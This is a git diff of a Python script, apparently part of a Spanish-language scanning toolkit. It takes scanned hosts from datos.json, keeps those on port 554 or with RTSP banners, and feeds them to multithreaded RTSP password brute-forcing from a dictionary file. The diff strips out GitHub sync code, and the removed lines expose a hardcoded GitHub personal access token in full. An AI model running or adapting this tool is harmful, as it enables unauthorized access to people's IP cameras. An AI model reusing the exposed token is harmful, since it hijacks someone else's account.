@@ -1,106 +1,35 @@
-import json
-import requests
-import base64
 import os
-from queue import Queue
+import json
+import time
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import threading
-import time
-from watchdog.observers import Observer
-from watchdog.events import FileSystemEventHandler
+from queue import Queue
+
 from rtspBrute import RTSPBruteModule
-from common import cargar_datos, guardar_datos, buscar_palabra, actualizar_datos, extraer_texto_desde_imagen
+from common import cargar_datos, actualizar_datos
 
-# Configuración de GitHub
-GITHUB_TOKEN = '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'  # Token de acceso personal de GitHub
-REPO_OWNER = 'TreonSearch'         # Propietario del repositorio
-REPO_NAME = 'Tron_Json'            # Nombre del repositorio
-FILE_PATH = 'datos.json'           # Ruta al archivo JSON
-FILE_NAME = 'datos.json'           # Nombre del archivo en GitHub
+class NoCacheHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        try:
+            super().do_GET()
+        except ConnectionAbortedError:
+            print("Se ha producido una conexión abortada por el cliente.")
 
+    def end_headers(self):
+        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
+        super().end_headers()
 
-            
+def start_http_server():
+    port = 8080
+    server_address = ('', port)
+    httpd = HTTPServer(server_address, NoCacheHandler)
+    print(f'Servidor iniciado en http://127.0.0.1:{port}')
 
-def download_from_github():
-    """Descargar el archivo datos.json desde GitHub si es más grande que el archivo local."""
-    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
-    headers = {'Authorization': f'token {GITHUB_TOKEN}'}
-    
-    response = requests.get(url, headers=headers)
-    
-    if response.status_code == 200:
-        remote_size = response.json()['size']
-        print(f'Tamaño del archivo remoto: {remote_size} bytes')
-
-        if os.path.exists(FILE_PATH):
-            local_size = os.path.getsize(FILE_PATH)
-            print(f'Tamaño del archivo local: {local_size} bytes')
-
-            if remote_size > local_size:
-                download_url = response.json()['download_url']
-                print("El archivo remoto es más grande, descargando...")
-
-                download_response = requests.get(download_url)
-                with open(FILE_PATH, 'wb') as file:
-                    file.write(download_response.content)
-                print("Archivo descargado exitosamente desde GitHub.")
-        else:
-            print("El archivo local no existe, descargando el archivo remoto.")
-            download_url = response.json()['download_url']
-            download_response = requests.get(download_url)
-            with open(FILE_PATH, 'wb') as file:
-                file.write(download_response.content)
-            print("Archivo descargado exitosamente desde GitHub.")
-        
-
-        # Subir el archivo reparado a GitHub
-        upload_to_github()
-        
-    else:
-        print(f"Error al obtener el archivo de GitHub: {response.content}")
-
-
-def upload_to_github():
-    """Subir el archivo datos.json a GitHub."""
-    with open(FILE_PATH, 'r', encoding='utf-8') as file:
-        content = file.read()
-
-    encoded_content = base64.b64encode(content.encode()).decode()
-
-    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
-    headers = {'Authorization': f'token {GITHUB_TOKEN}'}
-
-    response = requests.get(url, headers=headers)
-    
-    if response.status_code == 200:
-        sha = response.json()['sha']
-        data = {
-            'message': 'Actualización del archivo datos.json',
-            'content': encoded_content,
-            'sha': sha,
-            'branch': 'main'
-        }
-    else:
-        data = {
-            'message': 'Subida del archivo datos.json',
-            'content': encoded_content,
-            'branch': 'main'
-        }
-
-    response = requests.put(url, headers=headers, json=data)
-
-    if response.status_code == 201 or response.status_code == 200:
-        print("Archivo subido/actualizado correctamente.")
-    else:
-        print(f"Error al subir el archivo: {response.content}")
-
-class ChangeHandler(FileSystemEventHandler):
-    """Clase que maneja los cambios en el archivo datos.json."""
-    def on_modified(self, event):
-        if event.src_path == os.path.abspath(FILE_PATH):
-            print(f"El archivo {FILE_PATH} ha sido modificado. Actualizando servidor...")
-            reparar_json_malformado(FILE_PATH)
-            upload_to_github()
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("Servidor detenido.")
+        httpd.server_close()
 
 def brute_force_worker(q, dictionary_file):
     while True:
@@ -113,58 +42,38 @@ def brute_force_worker(q, dictionary_file):
         brute.run()
         q.task_done()
 
-def start_http_server(stop_event):
-    port = 8080
-    server_address = ('', port)
-    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
-    print(f'Servidor iniciado en http://127.0.0.1:{port}')
-
-    try:
-        while not stop_event.is_set():
-            httpd.handle_request()  # Procesa una solicitud HTTP sin bloquear el hilo principal
-    except KeyboardInterrupt:
-        print("Servidor detenido.")
-        httpd.server_close()
-        
-
-
 if __name__ == '__main__':
-    # Iniciar el servidor HTTP en un hilo para que funcione en paralelo
-    stop_event = threading.Event()
-    server_thread = threading.Thread(target=start_http_server, args=(stop_event,), daemon=True)
+    # Iniciar el hilo para actualizar datos
+    threading.Thread(target=actualizar_datos, daemon=True).start()
+
+    # Iniciar el servidor HTTP en un hilo separado
+    server_thread = threading.Thread(target=start_http_server, daemon=True)
     server_thread.start()
 
-    # Descargar el archivo desde GitHub si es necesario
-    download_from_github()
     
+    json_file = 'datos.json'
 
-    # Subir el archivo a GitHub
-    upload_to_github()
-    
-    actualizar_datos()
+    # Cargar los datos
+    data = cargar_datos()
 
-    with open(FILE_PATH, 'r', encoding='utf-8') as file:
-        json_data = file.read()
-
-    try:
-        data = json.loads(json_data)
-    except json.JSONDecodeError as e:
-        print(f"Error al analizar el JSON: {e}")
-        exit(1)
-
+    # Filtrar las entradas para obtener solo las que usan el puerto 554 o contienen 'RTSP' en el banner
     targets = [(entry['IP'], entry['Puerto']) for entry in data if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]
 
+    # Crear una cola para los trabajos de brute force
     q = Queue()
-
+    
+    # Enviar los targets a la cola
     for target in targets:
         q.put(target)
 
-    dictionary_file = "diccionario.txt"
-    num_worker_threads = 4
+    # Crear e iniciar los hilos de brute force
+    dictionary_file = "diccionario.txt"  # Asegúrate de que este archivo exista
+    num_worker_threads = 4  # Ajusta el número de hilos según sea necesario
     for _ in range(num_worker_threads):
         threading.Thread(target=brute_force_worker, args=(q, dictionary_file), daemon=True).start()
 
+    # Esperar a que todos los trabajos se completen
     q.join()
 
-    # Mantener el servidor activo
-    stop_event.wait()  # Esto mantiene el hilo del servidor activo
+    # Esperar a que el hilo del servidor HTTP termine antes de cerrar el programa principal
+    server_thread.join()
